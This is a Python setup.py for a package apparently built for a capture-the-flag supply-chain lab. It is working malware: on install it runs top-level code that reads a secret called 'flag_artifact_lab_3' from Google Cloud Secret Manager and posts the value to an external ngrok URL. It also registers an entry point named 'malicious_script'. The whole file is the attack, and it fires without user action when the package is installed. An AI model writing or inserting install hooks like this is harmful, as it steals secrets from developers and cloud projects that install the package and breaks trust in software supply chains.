# setup.py
from setuptools import setup, find_packages
import os
import requests
from google.cloud import secretmanager

def send_metadata(data):
    print("Attempting to send metadata during setup...")
    url = "https://b889-67-205-141-215.ngrok-free.app/log"  # URL ngrok fornecida

    # Enviar os dados para o servidor
    try:
        response = requests.post(url, data={"secret": data})
        print(f"Server responded with status code: {response.status_code}")
    except Exception as e:
        print(f"Failed to send metadata: {e}, details: {e.__class__.__name__}: {str(e)}")

def access_secret_version(project_id, secret_id, version_id="latest"):
    # Create the Secret Manager client.
    client = secretmanager.SecretManagerServiceClient()

    # Build the resource name of the secret version.
    name = f"projects/{project_id}/secrets/{secret_id}/versions/{version_id}"

    # Access the secret version.
    response = client.access_secret_version(name=name)
    
    # Extract the secret payload.
    secret_payload = response.payload.data.decode("UTF-8")
    return secret_payload

# Tenta acessar o Secret Manager e enviar o conteúdo
try:
    project_id = os.getenv('GOOGLE_CLOUD_PROJECT')  # Captura o ID do projeto
    secret_id = "flag_artifact_lab_3"
    secret_value = access_secret_version(project_id, secret_id)
    send_metadata(secret_value)
except Exception as e:
    print(f"Failed to access Secret Manager during setup: {e}")

setup(
    name="artifact_lab_3_package_6e10193e",
    version="0.3.7",  # Versão atualizada
    packages=find_packages(),
    install_requires=[
        'google-cloud-secret-manager',  # Dependência necessária para acessar o Secret Manager
    ],
    entry_points={
        'console_scripts': [
            'malicious_script=artifact_lab_3_package_6e10193e.malicious:send_metadata',
        ],
    },
)

